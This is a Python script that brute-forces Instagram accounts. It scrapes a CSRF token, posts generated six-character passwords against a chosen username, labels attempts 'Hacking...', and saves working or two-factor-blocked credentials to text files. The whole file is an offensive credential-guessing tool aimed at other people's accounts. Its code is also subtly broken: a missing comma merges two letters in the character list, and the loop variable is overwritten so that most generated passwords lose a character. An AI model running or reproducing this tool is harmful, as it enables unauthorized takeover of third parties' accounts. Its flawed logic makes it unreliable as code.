import re
from datetime import datetime
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input
import typer 
from tabulate import tabulate

letters = ['q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j''k','l','z','x','c','v','b','n','m','Q','W','E','R','T','Y','U','I','O','P','A','S','D','F','G','H','J','K','L','Z','X','C',
    'V','B','N','M','0','1','2','3','4','5','6','7','8','9','_','!','@','#','$','%','^','&','*','(',')','-','+','=',
]
def New_Br(user, pwd):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.get(link)
            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf
            })
            x_table = [
                    [typer.style(user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Hacking...",fg=typer.colors.RED)]
            ]
            print(tabulate(x_table,tablefmt="psql"))

            if 'authenticated": true' in r.text:
                pass_table=[
                        [typer.style(user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Hacked. Password in good.txt",fg=typer.colors.CYAN)]
                ]
                print(tabulate(pass_table,tablefmt="psql"))
                
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
            elif 'two_factor_required' in r.text:
                pass_table=[
                        [typer.style(user,fg=typer.colors.GREEN),typer.style(pwd,fg=typer.colors.GREEN),typer.style("Problem. Password in results_NeedVerfiy.txt.",fg=typer.colors.CYAN)]
                ]
                print(tabulate(pass_table,tablefmt='psql'))
                with open('results_NeedVerfiy.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')

def w6_start(username):
    with requests.Session() as s:
        for q in letters:
            for w in letters:
                for e in letters:
                    for r in letters:
                        for t in letters:
                            for y in letters:
                                q=q+w+e+r+t+y
                                New_Br(username, q)
                                q = ""